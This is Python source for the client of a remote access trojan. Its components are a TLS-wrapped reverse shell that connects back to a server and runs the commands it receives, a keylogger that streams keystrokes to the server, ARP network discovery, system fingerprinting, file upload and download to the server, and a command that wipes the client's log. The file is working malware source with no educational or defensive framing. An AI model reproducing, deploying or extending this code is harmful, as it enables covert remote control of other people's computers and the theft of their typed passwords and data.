from pynput.keyboard import Key, Listener
from time import strftime
from socket import timeout
import socket
import ssl
from threading import Thread
import subprocess
import os
import logging
import platform
import scapy.all as scapy

BUFFER_SIZE = 4096


def save_raw_file(file_name, data):
        current_file = open(file_name, 'wb')
        current_file.write(data)
        current_file.close()


def read_raw_file(file_name):
        current_file = open(file_name, 'rb')
        data = current_file.read()
        current_file.close()
        return data


class SecureCommunication:
    def __init__(self, ip_addresss, port):
        self.certFile = "cert.crt"
        self.ip_addresss = ip_addresss
        self.port = port
        self.ssl_sock = None

    def secure_connect(self):
        is_connected = False
        while not is_connected:
            try:
                socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.ssl_sock = ssl.wrap_socket(socks, cert_reqs=ssl.CERT_REQUIRED, ca_certs=self.certFile)
                self.ssl_sock.connect((self.ip_addresss, self.port))
                logging.info("Connected to {}:{}".format(self.ip_addresss, self.port))
                is_connected = True
            except ConnectionError:
                print("Unable to connect to {}:{} (ConnectionError) !".format(self.ip_addresss, self.port))
            except TimeoutError:
                print("Unable to connect to {}:{} (TimeoutError) !".format(self.ip_addresss, self.port))

    def download_file(self, data_size_str):
        try:
            data_size = int(data_size_str)
            if data_size > 0:
                print("[i] Download file size: ", data_size, "b")
                logging.info("Download file size: "+ str(data_size) +  "b")
                data_raw = self.ssl_sock.recv(data_size)
                file_path = self.recv_msg()
                save_raw_file(file_path, data_raw)
                print("[i] File downloaded !")
            else:
                print("[X] Invalid file !")
        except :
            print("[X] Error !")
            pass

    def upload_file(self, file_path):
        data_raw = read_raw_file(file_path)
        data_size = os.path.getsize(file_path)
        if data_size > 0:
            self.ssl_sock.write(str(data_size).encode())
            self.ssl_sock.write(data_raw)
            print("[i] File upload (size: ", data_size, "b )")
        else:
            self.ssl_sock.write("")

    def send_msg(self, message):
        try:
            self.ssl_sock.send(message.encode())
        except timeout:
            print("Warning:{0}".format(timeout))
            logging.warning("Warning:{0}".format(timeout))
        except ConnectionResetError:
            print("Error:{0}".format(timeout))
            logging.error("Error:{0}".format(timeout))

    def recv_msg(self):
        try:
            decrypted = self.ssl_sock.recv(BUFFER_SIZE)
            return decrypted.decode()
        except timeout:
            logging.warning("Connection lost (or timeout)!")
        except ConnectionResetError:
            print("Error:{0}".format(timeout))
            logging.error("Error:{0}".format(timeout))
        if self.ssl_sock is not None:
            try:
                decrypted = self.ssl_sock.recv(BUFFER_SIZE)
                return decrypted.decode("utf-8")
            except ConnectionError:
                logging.warning("Connection lost !")

    def clean_socket(self):

        if self.ssl_sock is not None:
            self.ssl_sock.close()


class ReverseShell(SecureCommunication, Thread):

    def __init__(self, ip_address, port):
        super().__init__(ip_address, port)
        Thread.__init__(self)

    def run(self):
        self.secure_connect()
        data = self.recv_msg()
        while data is not "exit":
            if data is not None and data[:2] == 'cd':
                os.chdir(data[3:])
            try:
                if data:
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", "ignore")
                    self.send_msg(output_str + str(os.getcwd()) + '> ')
                    data = self.recv_msg()
            except OSError as error:
                print("Error:{0}".format(error))
                logging.error("Error:{0}".format(error))
        self.clean_socket()


class KeyLogger(SecureCommunication, Thread):

    def __init__(self, ip_address, port):
        super().__init__(ip_address, port)
        Thread.__init__(self)
        self.data = []

    def run(self):
        self.secure_connect()

        def on_press(key):
            if format(key) == "Key.enter":
                time = strftime('%d/%m/%y %H:%M')
                self.send_msg("[KEYLOGGER]" + time + " " + ''.join(self.data).strip("'"))
                self.data = []
            if format(key) == "Key.space":
                self.data.append(" ")
            elif format(key) == "Key.shift":
                self.data.append("[MAJ]")
            elif format(key) == "Key.ctrl_l":
                self.data.append("[CTRL_L]")
            elif format(key) == "Key.ctrl_r":
                self.data.append("[CTRL_R]")
            elif format(key) == "Key.backspace":
                self.data.append("[DEL]")
            elif format(key)[:3] == "Key":
                self.data.append("")
            else:
                self.data.append(format(key).strip("'"))
        with Listener(on_press=on_press) as listener:
            listener.join()
        self.clean_socket()


def get_system_info():
    sys_info = platform.uname()
    system_info = "\n[System    ]\t" + sys_info.system + sys_info.release + "\n[Archi     ]\t" + sys_info.machine \
                  + "\n[Comp Name ]\t" + sys_info.node + "\n[Processor ]\t" + sys_info.processor + "\n[Time      ]\t" \
                  + strftime('%d/%m/%y %H:%M')
    return system_info


def get_client_log(log_file_name):
    file_name = open(log_file_name, 'r')
    data = file_name.read()
    file_name.close()
    return data


def set_log(log_file_name, is_not_verbose):
    if is_not_verbose:
        level_log = logging.ERROR
    else:
        level_log = logging.DEBUG
    log_format = '[%(asctime)-15s] [%(levelname)s] %(message)s'
    logging.basicConfig(filename=log_file_name, level=level_log, format=log_format)


def net_discovery(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
        output_message = "IP Address\t\tMAC Address\n"
        output_message += "--------------          -----------------\n"
        for element in answered_list[0]:
            output_message += element[1].psrc + "\t\t" + element[1].hwsrc + "\n"

        return output_message
    except socket.gaierror as error_arg:
        return "Error getaddrinfo {0}".format(error_arg)


def echo_service(secure_communication, server_ip, log_file_name):
    reverse_shell_port = 4444
    keylogger_port = 6667

    data = secure_communication.recv_msg()
    while data and data != 'q':
        print("SERVER # ", data)

        if data == "shell":
            rev_shell = ReverseShell(server_ip, reverse_shell_port)
            rev_shell.start()
            secure_communication.send_msg("OK " + data)

        elif data == "keylogger":
            keylogger_obj = KeyLogger(server_ip, keylogger_port)
            keylogger_obj.start()
            secure_communication.send_msg("OK " + data)

        elif data == "GetInfos":
            system_info = get_system_info()
            secure_communication.send_msg("[INFO]" + system_info)

        elif data == "GetLog":
            data = get_client_log(log_file_name)
            data_size = len(data)
            if data_size > 0:
                secure_communication.send_msg("[LOG]" + str(data_size))
                secure_communication.send_msg(data)
            secure_communication.send_msg("[LOG]0")

        elif data == "ClearLog":
            open(log_file_name, 'w').close()
            secure_communication.send_msg("OK log cleared")

        elif data[:12] == "NetDiscovery":
            data = net_discovery(data[12:])
            secure_communication.send_msg("[NetDisco]" + data)

        elif data[:6] == "[DOWN]": # TO upload a file to the server 
            secure_communication.upload_file(data[6:])

        elif data[:4] == "[UP]":  # TO download a file to the client 
            secure_communication.download_file(data[4:])

        else:
            secure_communication.send_msg("???")
        data = secure_communication.recv_msg()